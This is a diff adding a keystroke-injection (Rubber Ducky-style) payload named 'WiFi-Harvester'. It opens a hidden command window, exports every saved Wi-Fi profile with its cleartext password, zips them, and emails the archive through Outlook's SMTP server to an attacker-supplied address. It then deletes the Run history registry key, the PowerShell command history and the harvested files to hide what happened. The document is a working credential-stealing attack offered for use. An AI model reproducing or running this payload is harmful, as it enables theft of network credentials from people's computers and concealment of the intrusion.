@@ -1,0 +1,74 @@
+REM Title: WiFi-Harvester
+REM Author: tony
+REM Based on the code of: Siem TTommy
+REM: Version 1.1
+DELAY 2000
+GUI d
+DELAY 150
+GUI r
+DELAY 400
+STRING cmd
+ENTER
+DELAY 500
+STRING color FE & mode con:cols=18 lines=1
+ENTER
+REM --> Harvest
+STRING cd Desktop
+ENTER
+STRING mkdir A
+ENTER
+STRING cd A
+ENTER
+STRING netsh wlan export profile key=clear 
+ENTER
+DELAY 200
+STRING cd ..
+ENTER
+STRING powershell
+ENTER
+STRING Compress-Archive -Path A -DestinationPath A.zip
+ENTER
+REM --> Report
+REM --> Allow less secure app here https://myaccount.google.com/lesssecureapps
+DELAY 500
+STRING $SMTPServer = 'smtp-mail.outlook.com'
+ENTER
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+STRING $SMTPInfo.EnableSsl = $true
+ENTER
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('SENDER-EMAIL', 'SENDER-PASSWORD')
+ENTER
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+STRING $ReportEmail.From = 'SENDER-EMAIL'
+ENTER
+STRING $ReportEmail.To.Add('RECEIVER-EMAIL')
+ENTER
+STRING $ReportEmail.Subject = "1337"
+ENTER
+STRING $ReportEmail.Body = "GG, you got it"
+ENTER
+STRING $ReportEmail.Attachments.Add("A.zip")
+ENTER
+STRING $SMTPInfo.Send($ReportEmail)
+ENTER
+DELAY 400
+REM --> Clean up
+STRING REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
+ENTER
+STRING cd ..
+ENTER
+STRING cd AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
+ENTER
+STRING del ConsoleHost_history.txt
+ENTER
+STRING exit
+ENTER
+DELAY 100
+STRING del A & rmdir A
+ENTER
+STRING S
+ENTER
+STRING del A.zip & exit
+ENTER
